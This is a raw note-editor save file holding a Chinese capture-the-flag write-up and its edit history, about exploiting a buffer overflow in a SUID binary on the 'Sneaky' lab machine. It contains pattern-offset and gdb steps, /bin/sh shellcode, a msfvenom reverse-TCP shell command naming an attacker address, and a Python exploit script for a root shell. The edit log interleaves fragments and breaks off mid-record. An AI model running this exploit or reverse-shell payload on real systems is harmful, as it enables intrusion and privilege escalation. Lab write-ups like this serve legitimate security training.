500\n\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\n```\n**gdb调试该程序**\n\n[gdb用法](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html)\n```\ngdb -q chal\nrun Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\n```\n![2]($res/2.PNG)\n\n\n得到一个地址0x316d4130\n\n\n```\nlocate pattern_offset.rb\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 500 -q 316d4130\n```\n![3]($res/3.PNG)\n\noffset 362， 现在我们知道了第362就是要覆盖的返回地址。\n\n## 搜索shellcode\n\n【目标shell运行】uname -a\n```\nLinux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux\n```\n搜索i686，可得知目标机器是86位的机器。\n\ngoogle搜索关键词\"  packetstorm /bin/sh shellcode  \"\n```\nchar shellcode[] = \n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"                   \n\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"                   \n\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"                   \n\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";\n```\n## 生成shellcode\n参考资料：[https://whale3070.github.io/tools/2019/03/01/x/](https://whale3070.github.io/tools/2019/03/01/x/)\n\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.104 LPORT=443 -f c\n\n![4]($res/4.PNG)\n\n\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\"\n\"\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x68\\x68\"\n\"\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\"\n\"\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\"\n\"\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\n\n## exp\n\n",[[1578274025390,["whale@Whale",[[1,310,"- "]],[310,310],[312,312]]],[1578274031310,["whale@Whale",[[1,206,"www.youtube.com/watch?v=1UGxjqTnuyo](https://www.youtube.com/watch?v=1UGxjqTnuyo)[https://"]],[197,197],[287,287]]],[1578274035226,["whale@Whale",[[-1,206,"www.youtube.com/watch?v=1UGxjqTnuyo](https://www.youtube.com/watch?v=1UGxjqTnuyo)[https://"]],[287,287],[197,197]]],[1578274035742,["whale@Whale",[[-1,310,"- "]],[312,312],[310,310]]],[1578274038278,["whale@Whale",[[1,310,"-"]],[310,310],[311,311]]],[1578274039480,["whale@Whale",[[1,312,"\n"]],[311,311],[312,312]]],[1578274049202,["whale@Whale",[[1,311," [https://www.youtube.com/watch?v=1UGxjqTnuyo](https://www.youtube.com/watch?v=1UGxjqTnuyo)"]],[311,311],[402,402]]],[1578274315011,["whale@Whale",[[-1,195,"- [https://chickenpwny.github.io/hackthebox/boxes/sneaky/](https://chickenpwny.github.io/hackthebox/boxes/sneaky/)"]],[195,309],[195,195]]],[1578274315437,["whale@Whale",[[-1,195,"\n"]],[195,195],[194,194]]],[1578274323093,["whale@Whale",[[-1,198,"htt"],[-1,202,"s://www.youtube.com/watch?v=1UGxjqTnuyo"]],[198,241],[198,199]]],[1578274323306,["whale@Whale",[[1,199,"i"]],[198,199],[198,200]]],[1578274323551,["whale@Whale",[[1,200,"i"]],[198,200],[198,201]]],[1578274323960,["whale@Whale",[[-1,200,"i"]],[198,201],[198,200]]],[1578274324378,["whale@Whale",[[-1,198,"ip"]],[198,200],[198,198]]],[1578274325870,["whale@Whale",[[1,198,"ippps"]],[198,198],[203,203]]],[1578274326495,["whale@Whale",[[-1,201,"ps"]],[203,203],[201,201]]],[1578274327446,["whale@Whale",[[1,201,"se"]],[201,201],[203,203]]],[1578274336207,["whale@Whale",[[1,203,"c youtube video"]],[203,203],[218,218]]],[1578274914176,["whale@Whale",[[-1,314,"\n"]],[314,314],[314,314]]],[1578285439862,["whale@Whale",[[-1,2571,"## 生成shellcode\n参考资料：[https://whale3070.github.io/tools/2019/03/01/x/](https://whale3070.github.io/tools/2019/03/01/x/)\n\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.104 LPORT=443 -f c\n\n![4]($res/4.PNG)\n\n\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\"\n\"\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x68\\x68\"\n\"\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\"\n\"\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\"\n\"\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"]],[2571,3069],[2571,2571]]],[1578286659104,["whale@Whale",[[1,2580,"/usr/local/bin/chal $(python exploit.py)"]],[2580,2580],[2620,2620]]],[1578286663067,["whale@Whale",[[-1,2610,"xploit"]],[2609,2616],[2610,2610]]],[1578286663264,["whale@Whale",[[1,2610,"xp"]],[2610,2610],[2612,2612]]],[1578286748820,["whale@Whale",[[1,2580,"\n"]],[2579,2579],[2580,2580]]],[1578286749597,["whale@Whale",[[1,2580,"from struct import pack shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" shellcode +=\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" shellcode +=\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" shellcode +=\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\" buffersize = 362 nop = \"\\x90\" * (buffersize - len(shellcode)) eip = pack('<L', 0xbffff85c) payload = nop + shellcode + eip print payload"]],[2580,2580],[2912,2912]]],[1578286751415,["whale@Whale",[[-1,2580,"from struct import pack shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" shellcode +=\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" shellcode +=\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" shellcode +=\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\" buffersize = 362 nop = \"\\x90\" * (buffersize - len(shellcode)) eip = pack('<L', 0xbffff85c) payload = nop + shellcode + eip print payload"]],[2912,2912],[2580,2580]]],[1578286771925,["whale@Whale",[[1,2580,"```"]],[2580,2580],[2583,2583]]],[1578286772223,["whale@Whale",[[1,2584,"\n"]],[2583,2583],[2584,2584]]],[1578286772437,["whale@Whale",[[1,2585,"\n"]],[2584,2584],[2585,2585]]],[1578286773088,["whale@Whale",[[1,2585,"```"]],[2585,2585],[2588,2588]]],[1578286774699,["whale@Whale",[[1,2584,"from struct import pack\r\n\r\nshellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"\r\nshellcode +=\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"\r\nshellcode +=\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"\r\nshellcode +=\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\r\n\r\nbuffersize = 362\r\n\r\nnop = \"\\x90\" * (buffersize - len(shellcode))\r\neip = pack('<L', 0xbffff85c)\r\npayload = nop + shellcode + eip\r\n\r\nprint payload\r\n"]],[2584,2584],[2935,2935]]],[1578286855168,[null,[[-1,2607,"\r\n\r"],[1,2610,"\n\n\n"],[-1,2653,"\r"],[1,2654,"\n"],[-1,2697,"\r"],[1,2698,"\n"],[-1,2741,"\r"],[1,2742,"\n"],[-1,2785,"\r\n\r"],[1,2788,"\n\n\n"],[-1,2805,"\r\n\r"],[1,2808,"\n\n\n"],[-1,2853,"\r"],[1,2854,"\n"],[-1,2883,"\r"],[1,2884,"\n"],[-1,2916,"\r\n\r"],[1,2919,"\n\n\n"],[-1,2933,"\r"],[1,2934,"\n"]],[2607,2607],[2935,2935]]],[1578286855168,[null,[[1,2607,"\r\n\r"],[-1,2607,"\n\n\n"],[1,2653,"\r"],[-1,2653,"\n"],[1,2697,"\r"],[-1,2697,"\n"],[1,2741,"\r"],[-1,2741,"\n"],[1,2785,"\r\n\r"],[-1,2785,"\n\n\n"],[1,2805,"\r\n\r"],[-1,2805,"\n\n\n"],[1,2853,"\r"],[-1,2853,"\n"],[1,2883,"\r"],[-1,2883,"\n"],[1,2916,"\r\n\r"],[-1,2916,"\n\n\n"],[1,2933,"\r"],[-1,2933,"\n"]],[2935,2935],[2607,2607]]],[1578286824524,["whale@Whale",[[-1,690,"EIP地址"],[1,695,"f"],[-1,2607,"\r"],[-1,2609,"\r"],[-1,2653,"\r"],[-1,2697,"\r"],[-1,2741,"\r"],[-1,2785,"\r"],[-1,2787,"\r"],[-1,2805,"\r"],[-1,2807,"\r"],[-1,2853,"\r"],[-1,2883,"\r"],[-1,2916,"\r"],[-1,2918,"\r"],[-1,2933,"\r"]],[690,695],[691,691]]],[1578286824732,["whale@Whale",[[1,691,"a"]],[691,691],[692,692]]],[1578286825329,["whale@Whale",[[-1,690,"fa"]],[692,692],[690,690]]],[1578286848473,["whale@Whale",[[1,690,"缓冲区长度为362字节"]],[690,690],[701,701]]],[1578286909647,["whale@Whale",[[1,2577,"## "]],[2577,2577],[2580,2580]]],[1578286925486,["whale@Whale",[[1,2580,"gdb调试获取一个"]],[2580,2580],[2589,2589]]],[1578286927647,["whale@Whale",[[-1,2585,"获取一个"]],[2589,2589],[2585,2585]]],[1578286939119,["whale@Whale",[[1,2585,"选择溢出后的返回地址"]],[2585,2585],[2595,2595]]],[1578286939355,["whale@Whale",[[1,2597,"\n"]],[2595,2595],[2596,2596]]],[1578286957927,["whale@Whale",[[1,2596,"gdb /usr/local/bin/chal"]],[2596,2596],[2619,2619]]],[1578286992945,["whale@Whale",[[1,2620,"run $(python -c 'print \"A\"*500')"]],[2620,2620],[2652,2652]]],[1578287012098,["whale@Whale",[[1,2653,"\n"]],[2652,2652],[2653,2653]]],[1578287032174,["whale@Whale",[[1,2653,"x/500x $esp      查看栈"]],[2653,2653],[2673,2673]]],[1578287068256,["whale@Whale",[[1,2673,"指针寄存器ESP，55"]],[2673,2673],[2684,2684]]],[1578287068871,["whale@Whale",[[-1,2683,"5"]],[2684,2684],[2683,2683]]],[1578287078487,["whale@Whale",[[1,2683,"00字节的内容，每次"]],[2683,2683],[2693,2693]]],[1578287079831,["whale@Whale",[[-1,2691,"每次"]],[2693,2693],[2691,2691]]],[1578287089279,["whale@Whale",[[1,2691,"每次输出100字节，分"]],[2691,2691],[2702,2702]]],[1578287090198,["whale@Whale",[[-1,2701,"分"]],[2702,2702],[2701,2701]]],[1578287092055,["whale@Whale",[[1,2701,"按照"]],[2701,2701],[2703,2703]]],[1578287092764,["whale@Whale",[[-1,2701,"按照"]],[2703,2703],[2701,2701]]],[1578287094469,["whale@Whale",[[1,2701,"按照"]],[2701,2701],[2703,2703]]],[1578287094572,["whale@Whale",[[-1,2702,"照"]],[2703,2703],[2702,2702]]],[1578287097331,["whale@Whale",[[1,2702,"enterJian"]],[2702,2702],[2711,2711]]],[1578287098167,["whale@Whale",[[-1,2707,"Jian"]],[2711,2711],[2707,2707]]],[1578287105123,["whale@Whale",[[1,2707,"键查看下一1"]],[2707,2707],[2713,2713]]],[1578287105895,["whale@Whale",[[-1,2711,"一1"]],[2713,2713],[2711,2711]]],[1578287116816,["whale@Whale",[[1,2711,"一个100字节内容，分为5次输出"]],[2711,2711],[2727,2727]]],[1578287429031,["whale@Whale",[[1,2728,"\n"]],[2727,2727],[2728,2728]]],[1578290362246,["whale@Whale",[[-1,3077,"\n"]],[3077,3077],[3076,3076]]],[1578290532921,["whale@Whale",[[1,2729,"\n"]],[2728,2728],[2729,2729]]],[1578290535306,["whale@Whale",[[1,2729,"0xbffff8a0"]],[2729,2729],[2739,2739]]],[1578290702597,["whale@Whale",[[1,2729,"eip = pack('<L', "],[-1,2737,"a0"],[1,2739,"5c)"]],[2729,2739],[2757,2757]]],[1578290857777,["whale@Whale",[[-1,2754,"5c"],[1,2756,"a0"]],[2746,2756],[2756,2756]]],[1578291117515,["whale@Whale",[[1,2758,"\n"]],[2757,2757],[2758,2758]]],[1578291117909,["whale@Whale",[[1,2758,"0x316d4130"]],[2758,2758],[2768,2768]]],[1578291122203,["whale@Whale",[[1,2758,"\n"]],[2757,2757],[2758,2758]]],[1578291122533,["whale@Whale",[[1,2758,"eip = pack('<L', 0xbffff8a0)"]],[2758,2758],[2786,2786]]],[1578291127674,["whale@Whale",[[-1,2777,"bffff8a"],[1,2784,"316d413"]],[2775,2785],[2785,2785]]],[1578291557570,["whale@Whale",[[-1,2758,"eip = pack('<L', 0x316d4130)"]],[2758,2786],[2758,2758]]],[1578291561560,["whale@Whale",[[-1,2759,"0x316d4130"]],[2759,2769],[2759,2759]]],[1578291573656,["whale@Whale",[[1,2759,"gdbr"]],[2759,2759],[2763,2763]]],[1578291574126,["whale@Whale",[[-1,2762,"r"]],[2763,2763],[2762,2762]]],[1578291574960,["whale@Whale",[[1,2762," "]],[2762,2762],[2763,2763]]],[1578291577628,["whale@Whale",[[1,2764,"\n"]],[2763,2763],[2764,2764]]],[1578291577948,["whale@Whale",[[1,2764,"$(python exp.py)"]],[2764,2764],[2780,2780]]],[1578291580386,["whale@Whale",[[1,2764,"run "]],[2764,2764],[2768,2768]]],[1578291584408,["whale@Whale",[[1,2763,"/usr/local/bin/chal"]],[2759,2763],[2782,2782]]],[1578291629054,["whale@Whale",[[1,2804,"\n"]],[2803,2803],[2804,2804]]],[1578291629728,["whale@Whale",[[1,2804,"x/500x $esp"]],[2804,2804],[2815,2815]]],[1578291769014,["whale@Whale",[[-1,2806,"5"]],[2807,2807],[2806,2806]]],[1578291769646,["whale@Whale",[[1,2806,"4"]],[2806,2806],[2807,2807]]],[1578292136110,["whale@Whale",[[1,2758,"0xbffff850"]],[2758,2758],[2768,2768]]],[1578292144074,["whale@Whale",[[-1,2746,"0xbffff8a0"]],[2746,2756],[2746,2746]]],[1578292144421,["whale@Whale",[[1,2746,"0xbffff850"]],[2746,2746],[2756,2756]]],[1578292148904,["whale@Whale",[[-1,2729,"eip = pack('<L', 0xbffff850)"]],[2729,2757],[2729,2729]]],[1578301526596,["whale@Whale",[[1,2729,"z"]],[2729,2729],[2730,2730]]],[1578301527170,["whale@Whale",[[-1,2729,"z"]],[2730,2730],[2729,2729]]],[1578301530870,["whale@Whale",[[1,2729,"字符串A,zh"]],[2729,2729],[2736,2736]]],[1578301531548,["whale@Whale",[[-1,2733,",zh"]],[2736,2736],[2733,2733]]],[1578301543889,["whale@Whale",[[1,2733,"，转换为十六进制jius"]],[2733,2733],[2745,2745]]],[1578301545398,["whale@Whale",[[-1,2741,"jius"]],[2745,2745],[2741,2741]]],[1578301546847,["whale@Whale",[[1,2741,"就是、"]],[2741,2741],[2744,2744]]],[1578301547415,["whale@Whale",[[-1,2743,"、"]],[2744,2744],[2743,2743]]],[1578301550595,["whale@Whale",[[1,2743,"\\x41"]],[2743,2743],[2747,2747]]],[1578301556979,["whale@Whale",[[1,2748,"\n"]],[2747,2747],[2748,2748]]],[1578301569157,["whale@Whale",[[1,2749,"![5]($res/5.PNG)\n\n"]],[2748,2748],[2766,2766]]],[1578301588745,["whale@Whale",[[1,2766,"xia"]],[2766,2766],[2769,2769]]],[1578301589531,["whale@Whale",[[-1,2766,"xia"]],[2769,2769],[2766,2766]]],[1578301592827,["whale@Whale",[[1,2766,"先随便招"]],[2766,2766],[2770,2770]]],[1578301593759,["whale@Whale",[[-1,2769,"招"]],[2770,2770],[2769,2769]]],[1578301594913,["whale@Whale",[[1,2769,"招"]],[2769,2769],[2770,2770]]],[1578301595315,["whale@Whale",[[-1,2769,"招"]],[2770,2770],[2769,2769]]],[1578301604914,["whale@Whale",[[1,2769,"找一个地址是"]],[2769,2769],[2775,2775]]],[1578301605780,["whale@Whale",[[-1,2774,"是"]],[2775,2775],[2774,2774]]],[1578301610856,["whale@Whale",[[1,2774,"是\\x41的"]],[2774,2774],[2780,2780]]],[1578301691843,["whale@Whale",[[1,2780,"地址，比如说"]],[2780,2780],[2786,2786]]],[1578301692760,["whale@Whale",[[-1,2786,"\n"]],[2786,2786],[2786,2786]]],[1578301694233,["whale@Whale",[[1,2797,"\n"]],[2796,2796],[2797,2797]]],[1578301708645,["whale@Whale",[[1,2797,"eip = pack('<L', 0xbffff85c)"]],[2797,2797],[2825,2825]]],[1578301823143,["whale@Whale",[[1,2826,"\n"]],[2825,2825],[2826,2826]]],[1578301823326,["whale@Whale",[[1,2827,"\n"]],[2826,2826],[2827,2827]]],[1578301823490,["whale@Whale",[[1,2828,"\n"]],[2827,2827],[2828,2828]]],[1578301823681,["whale@Whale",[[1,2829,"\n"]],[2828,2828],[2829,2829]]],[1578301873454,["whale@Whale",[[1,2828,"![6]($res/6.PNG)\n\n"]],[2827,2827],[2845,2845]]],[1578302021514,["whale@Whale",[[-1,2794,"5"]],[2795,2795],[2794,2794]]],[1578302022762,["whale@Whale",[[1,2794,"2"]],[2794,2794],[2795,2795]]],[1578302029886,["whale@Whale",[[-1,2814,"0xbffff85c"]],[2815,2824],[2814,2814]]],[1578302030552,["whale@Whale",[[1,2814,"0xbffff820"]],[2814,2814],[2824,2824]]],[1578302129734,["whale@Whale",[[-1,2847,"\n"]],[2847,2847],[2846,2846]]],[1578302138205,["whale@Whale",[[-1,2828,"![6]($res/6.PNG)\n"]],[2828,2845],[2828,2828]]],[1578302153326,["whale@Whale",[[1,2827,"写一个exp do"]],[2827,2827],[2836,2836]]],[1578302153682,["whale@Whale",[[-1,2835,"o"]],[2836,2836],[2835,2835]]],[1578302154234,["whale@Whale",[[1,2835,"emo"]],[2835,2835],[2838,2838]]],[1578302154836,["whale@Whale",[[1,2841,"\n"]],[2838,2838],[2839,2839]]],[1578302160352,["whale@Whale",[[-1,2842,"gdb /usr/local/bin/chal\nrun $(python exp.py)\nx/400x $esp"]],[2842,2898],[2842,2842]]],[1578302162013,["whale@Whale",[[-1,2842,"\n"]],[2842,2842],[2841,2841]]],[1578302162253,["whale@Whale",[[-1,2841,"\n"]],[2841,2841],[2840,2840]]],[1578302162521,["whale@Whale",[[-1,2840,"\n"]],[2840,2840],[2839,2839]]],[1578302164237,["whale@Whale",[[-1,2839,"\n"]],[2839,2839],[2838,2838]]],[1578302166795,["whale@Whale",[[1,3228,"\n"]],[3227,3227],[3228,3228]]],[1578302167016,["whale@Whale",[[1,3229,"\n"]],[3228,3228],[3229,3229]]],[1578302168510,["whale@Whale",[[1,3228,"gdb /usr/local/bin/chal\nrun $(python exp.py)\nx/400x $esp"]],[3228,3228],[3284,3284]]],[1578302169908,["whale@Whale",[[1,3228,"\n"]],[3227,3227],[3228,3228]]],[1578302170132,["whale@Whale",[[1,3229,"\n"]],[3228,3228],[3229,3229]]],[1578302170339,["whale@Whale",[[1,3230,"\n"]],[3229,3229],[3230,3230]]],[1578302170555,["whale@Whale",[[1,3231,"\n"]],[3230,3230],[3231,3231]]],[1578302176270,["whale@Whale",[[1,2845," demo"]],[2845,2845],[2850,2850]]],[1578302184251,["whale@Whale",[[1,2797,"\n"]],[2797,2797],[2798,2798]]],[1578302190080,["whale@Whale",[[-1,3142,"5c"],[1,3144,"20"]],[3117,3145],[3145,3145]]],[1578302220155,["whale@Whale",[[1,3197,"\n"]],[3196,3196],[3197,3197]]],[1578302221931,["whale@Whale",[[1,3197,"gdb /usr/local/bin/chal"]],[3197,3197],[3220,3220]]],[1578302222988,["whale@Whale",[[1,3221,"\n"]],[3220,3220],[3221,3221]]],[1578302229236,["whale@Whale",[[1,3221,"run $(python exp.py)"]],[3197,3221],[3241,3241]]],[1578302229858,["whale@Whale",[[1,3242,"\n"]],[3241,3241],[3242,3242]]],[1578302230099,["whale@Whale",[[1,3243,"\n"]],[3242,3242],[3243,3243]]],[1578302230323,["whale@Whale",[[1,3244,"\n"]],[3243,3243],[3244,3244]]],[1578302280271,["whale@Whale",[[1,3244,"![6]($res/6.PNG)\n\n"]],[3243,3243],[3261,3261]]],[1578302296634,["whale@Whale",[[1,3303,"![7]($res/7.PNG)\n\n"]],[3261,3261],[3320,3320]]],[1578302299955,["whale@Whale",[[-1,3244,"![6]($res/6.PNG)"]],[3244,3260],[3244,3244]]],[1578302305942,["whale@Whale",[[-1,3287,"![7]($res/7.PNG)"]],[3287,3303],[3287,3287]]],[1578302308066,["whale@Whale",[[1,3242,"![7]($res/7.PNG)"]],[3242,3242],[3258,3258]]],[1578302314670,["whale@Whale",[[1,3260,"t"]],[3260,3260],[3261,3261]]],[1578302315085,["whale@Whale",[[-1,3260,"t"]],[3261,3261],[3260,3260]]],[1578302316361,["whale@Whale",[[1,3242,"\n"]],[3242,3242],[3243,3243]]],[1578302317060,["whale@Whale",[[1,3242,"t"]],[3242,3242],[3243,3243]]],[1578302318006,["whale@Whale",[[-1,3242,"t"]],[3243,3243],[3242,3242]]],[1578302320565,["whale@Whale",[[1,3242,"调试demo"]],[3242,3242],[3248,3248]]],[1578302322555,["whale@Whale",[[1,3242,"\n"]],[3242,3242],[3243,3243]]],[1578302326940,["whale@Whale",[[1,3245,"exp "]],[3245,3245],[3249,3249]]],[1578302409380,["whale@Whale",[[1,3070,"       #缓冲区长度是362，之前奖过"]],[3070,3070],[3092,3092]]],[1578302410493,["whale@Whale",[[-1,3090,"奖过"]],[3092,3092],[3090,3090]]],[1578302417780,["whale@Whale",[[1,3090,"说过如何计算得出"]],[3090,3090],[3098,3098]]],[1578302449254,["whale@Whale",[[1,2923,"  #shellcode是二进制代码"]],[2923,2923],[2941,2941]]],[1578302454673,["whale@Whale",[[1,2936,"c语言"]],[2936,2936],[2939,2939]]],[1578302456416,["whale@Whale",[[1,2944,"，"]],[2944,2944],[2945,2945]]],[1578302481005,["whale@Whale",[[1,2988,"  #作用是将/bin/sh"]],[2988,2988],[3002,3002]]],[1578302483192,["whale@Whale",[[1,3002,"调出"]],[3002,3002],[3004,3004]]],[1578302484007,["whale@Whale",[[1,3005,"\n"]],[3004,3004],[3005,3005]]],[1578302484666,["whale@Whale",[[-1,3005,"\n"]],[3005,3005],[3004,3004]]],[1578302511432,["whale@Whale",[[1,3047,"  #因为程序是suid权限，所以运行后调出/bin/sh就是root权限的shell"]],[3047,3047],[3090,3090]]],[1578302520003,["whale@Whale",[[-1,3062,"所以运行后调出/bin/sh就是root权限的shell"]],[3062,3090],[3062,3062]]],[1578302525564,["whale@Whale",[[1,3105,"  #所以运行后调出/bin/sh就是root权限的shell"]],[3105,3105],[3136,3136]]],[1578302574933,["whale@Whale",[[1,3228,"  #hu"]],[3228,3228],[3233,3233]]],[1578302575511,["whale@Whale",[[-1,3231,"hu"]],[3233,3233],[3231,3231]]],[1578302587978,["whale@Whale",[[1,3231,"缓冲区长度减去shellcode的长度，其他"]],[3231,3231],[3253,3253]]],[1578302588561,["whale@Whale",[[-1,3251,"其他"]],[3253,3253],[3251,3251]]],[1578302596075,["whale@Whale",[[1,3251,"其余部分用\\x90填充"]],[3251,3251],[3262,3262]]],[1578302601791,["whale@Whale",[[1,3291," "]],[3291,3291],[3292,3292]]],[1578302608383,["whale@Whale",[[1,3292,"           #eips "]],[3292,3292],[3309,3309]]],[1578302608932,["whale@Whale",[[-1,3307,"s "]],[3309,3309],[3307,3307]]],[1578302610801,["whale@Whale",[[1,3307,"是返回"]],[3307,3307],[3310,3310]]],[1578302612185,["whale@Whale",[[-1,3307,"是返回"]],[3310,3310],[3307,3307]]],[1578302614020,["whale@Whale",[[1,3307,"执行"]],[3307,3307],[3309,3309]]],[1578302614528,["whale@Whale",[[-1,3307,"执行"]],[3309,3309],[3307,3307]]],[1578302640149,["whale@Whale",[[1,3307,"指向返回地址，在溢出完成后，使得指令继续正常向后运行"]],[3307,3307],[3333,3333]]],[1578302659423,["whale@Whale",[[1,3409,"\n"]],[3409,3409],[3410,3410]]],[1578302852990,["whale@Whale",[[1,3504,"0xbffff790"]],[3504,3504],[3514,3514]]],[1578302864728,["whale@Whale",[[-1,3541,"run $(python exp.py)\nx/400x $esp"]],[3541,3573],[3541,3541]]],[1578302866401,["whale@Whale",[[1,3461,"run $(python exp.py)\nx/400x $esp"]],[3461,3461],[3493,3493]]],[1578302889610,["whale@Whale",[[1,3494,"nop = \"\\x90\" * (buffersize - len(shellcode))  #缓冲区长度减去shellcode的长度，其余部分用\\x90填充"]],[3494,3494],[3572,3572]]],[1578302891900,["whale@Whale",[[1,3494,"\n"]],[3493,3493],[3494,3494]]],[1578302892845,["whale@Whale",[[1,3494,"y"]],[3494,3494],[3495,3495]]],[1578302893462,["whale@Whale",[[-1,3494,"y"]],[3495,3495],[3494,3494]]],[1578302901636,["whale@Whale",[[1,3494,"因为\\x90被"]],[3494,3494],[3501,3501]]],[1578302904698,["whale@Whale",[[1,3501,"填充"]],[3501,3501],[3503,3503]]],[1578302905513,["whale@Whale",[[-1,3500,"被填充"]],[3503,3503],[3500,3500]]],[1578302916132,["whale@Whale",[[1,3496,"exp上写了 "]],[3496,3496],[3503,3503]]],[1578302917125,["whale@Whale",[[-1,3502," "]],[3503,3503],[3502,3502]]],[1578302920035,["whale@Whale",[[1,3502,"其余"]],[3502,3502],[3504,3504]]],[1578302920496,["whale@Whale",[[-1,3502,"其余"]],[3504,3504],[3502,3502]]],[1578302929878,["whale@Whale",[[1,3502,"除了shellcode部分，其余部分用"]],[3502,3502],[3521,3521]]],[1578302932420,["whale@Whale",[[1,3525,"填充"]],[3525,3525],[3527,3527]]],[1578302937418,["whale@Whale",[[1,3494,"\n"]],[3494,3494],[3495,3495]]],[1578302943115,["whale@Whale",[[-1,3529,"nop = \"\\x90\" * (buffersize - len(shellcode))  #缓冲区长度减去shellcode的长度，其余部分用\\x90填充"]],[3529,3607],[3529,3529]]],[1578302944892,["whale@Whale",[[1,3494,"nop = \"\\x90\" * (buffersize - len(shellcode))  #缓冲区长度减去shellcode的长度，其余部分用\\x90填充"]],[3494,3494],[3572,3572]]],[1578302946978,["whale@Whale",[[1,3494,"\n"]],[3493,3493],[3494,3494]]],[1578302947195,["whale@Whale",[[1,3495,"\n"]],[3494,3494],[3495,3495]]],[1578302948878,["whale@Whale",[[1,3495,"··"]],[3495,3495],[3497,3497]]],[1578302949618,["whale@Whale",[[-1,3495,"··"]],[3497,3497],[3495,3495]]],[1578302951201,["whale@Whale",[[1,3496,"`"]],[3496,3496],[3497,3497]]],[1578302952530,["whale@Whale",[[1,3575,"`"]],[3575,3575],[3576,3576]]],[1578302954642,["whale@Whale",[[1,3613,"\n"]],[3611,3611],[3612,3612]]],[1578302954990,["whale@Whale",[[1,3612,"s"]],[3612,3612],[3613,3613]]],[1578302955490,["whale@Whale",[[-1,3612,"s"]],[3613,3613],[3612,3612]]],[1578302961219,["whale@Whale",[[1,3612,"所以找到一个地址"]],[3612,3612],[3620,3620]]],[1578302972246,["whale@Whale",[[1,3620,"0xbffff7c0"]],[3620,3620],[3630,3630]]],[1578302977372,["whale@Whale",[[1,3618,"s"]],[3618,3618],[3619,3619]]],[1578302977984,["whale@W